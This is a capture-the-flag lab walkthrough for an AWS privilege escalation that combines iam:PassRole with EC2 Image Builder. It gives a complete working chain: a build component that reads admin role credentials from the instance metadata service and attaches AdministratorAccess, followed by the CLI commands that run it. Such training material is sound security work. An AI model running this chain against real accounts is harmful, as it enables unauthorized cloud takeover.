# Guided Walkthrough: Privilege Escalation via iam:PassRole + EC2 Image Builder

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole` and EC2 Image Builder permissions can create a build pipeline whose component shell commands execute on an EC2 instance running with an admin instance profile, ultimately granting the starting user `AdministratorAccess`.

EC2 Image Builder is a managed service for building, testing, and distributing machine images. When you create an infrastructure configuration, you specify an instance profile — the IAM role that the build instance will use. If an attacker can pass a privileged role to an infrastructure configuration and define the component shell commands that run on the build instance, they get arbitrary code execution under that role via IMDS.

This is a variant of the "PassRole + Service" privilege escalation pattern. Unlike Lambda or Glue (which execute code in seconds or minutes), Image Builder builds take 10-30+ minutes because they involve launching an EC2 instance, running the build, running test phases, and attempting to create an AMI. However, the privilege escalation action (`iam:AttachUserPolicy`) executes during the build phase — the build may ultimately fail, but the damage is done.

## The Challenge

You start as `pl-prod-imagebuilder-001-to-admin-starting-user` — an IAM user with `iam:PassRole` on the admin role, plus `imagebuilder:CreateComponent`, `imagebuilder:CreateImageRecipe`, `imagebuilder:CreateInfrastructureConfiguration`, and `imagebuilder:CreateImage`. Your goal is to reach effective administrator access in the account.

The target role, `pl-prod-imagebuilder-001-to-admin-admin-role`, has `AdministratorAccess` attached and trusts `ec2.amazonaws.com`. It is already bound to an instance profile (`pl-prod-imagebuilder-001-to-admin-admin-profile`) that can be passed to Image Builder infrastructure configurations.

## Reconnaissance

Confirm your identity and verify you don't already have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-imagebuilder-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, you're not admin yet
```

Get the account ID — you'll need it to construct ARNs:

```bash
aws sts get-caller-identity --query 'Account' --output text
```

## Exploitation

### Step 1: Create the malicious component

Components define the shell commands that run on the build instance. Write a YAML document specifying an `ExecuteBash` action:

```yaml
name: ExploitComponent
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: Exploit
        action: ExecuteBash
        inputs:
          commands:
            - |
              TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
                -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
              ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                http://169.254.169.254/latest/meta-data/iam/security-credentials/)
              CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
              export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
              export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
              export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')
              aws iam attach-user-policy \
                --user-name pl-prod-imagebuilder-001-to-admin-starting-user \
                --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Upload this to Image Builder:

```bash
aws imagebuilder create-component \
    --name pl-prod-imagebuilder-001-to-admin-component \
    --semantic-version 1.0.0 \
    --platform Linux \
    --data "$(cat component.yaml)"
# {"componentBuildVersionArn": "arn:aws:imagebuilder:..."}
```

### Step 2: Get the base AMI

Image Builder needs a parent image. Use the AWS Systems Manager public parameter to find the latest Amazon Linux 2023 AMI:

```bash
aws ssm get-parameter \
    --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
    --query 'Parameter.Value' --output text
# ami-0abc123...
```

### Step 3: Create the image recipe

The recipe combines a base AMI with components:

```bash
aws imagebuilder create-image-recipe \
    --name pl-prod-imagebuilder-001-to-admin-recipe \
    --semantic-version 1.0.0 \
    --parent-image ami-0abc123... \
    --components componentArn=arn:aws:imagebuilder:...:component/...
```

### Step 4: Create the infrastructure configuration (PassRole)

This is where `iam:PassRole` is exercised. Specifying `--instance-profile-name` passes the admin role's instance profile to Image Builder:

```bash
aws imagebuilder create-infrastructure-configuration \
    --name pl-prod-imagebuilder-001-to-admin-infra-config \
    --instance-profile-name pl-prod-imagebuilder-001-to-admin-admin-profile \
    --instance-types t3.medium \
    --subnet-id subnet-... \
    --security-group-ids sg-... \
    --terminate-instance-on-failure
```

### Step 5: Trigger the image build

```bash
aws imagebuilder create-image \
    --image-recipe-arn arn:aws:imagebuilder:...:image-recipe/... \
    --infrastructure-configuration-arn arn:aws:imagebuilder:...:infrastructure-configuration/...
# {"imageBuildVersionArn": "arn:aws:imagebuilder:..."}
```

### Step 6: Wait for the build phase to execute

Image Builder launches an EC2 instance, runs SSM Agent bootstrap, then executes your component. This takes 10-30 minutes. Poll the build status:

```bash
aws imagebuilder get-image \
    --image-build-version-arn arn:aws:imagebuilder:... \
    --query 'image.state.status' --output text
# PENDING ... BUILDING ... (may ultimately show FAILED, but exploit ran)
```

The build may ultimately fail if Image Builder cannot complete the full pipeline, but the component's `ExecuteBash` step runs during the `BUILDING` phase — before the AMI creation step. Once the component runs, the `iam:AttachUserPolicy` call has already been made.

## Verification

Check for `AdministratorAccess` on the starting user:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-imagebuilder-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Returns user list — you have admin access
```

Wait ~15 seconds after the policy attachment for IAM propagation if the call just completed.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy you just gained provides implicitly.

Using the starting user credentials (which now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/imagebuilder-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario — only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Service" pattern through EC2 Image Builder. The key insight is that Image Builder components define shell commands that execute on build instances with whatever IAM permissions the instance profile provides. By controlling both the component content (shell commands) and the infrastructure configuration (which instance profile to use), an attacker with `iam:PassRole` on an admin role can achieve arbitrary code execution under that role — without ever directly assuming it.

The long build time (10-30 minutes) is the main operational difference from Lambda or Glue based privilege escalation. In real environments this pattern appears when developers are granted broad Image Builder permissions to manage AMI pipelines, but the roles attached to those pipelines are not scoped down. An organization that allows any developer to create infrastructure configurations and attach arbitrary instance profiles to them is vulnerable to this technique.
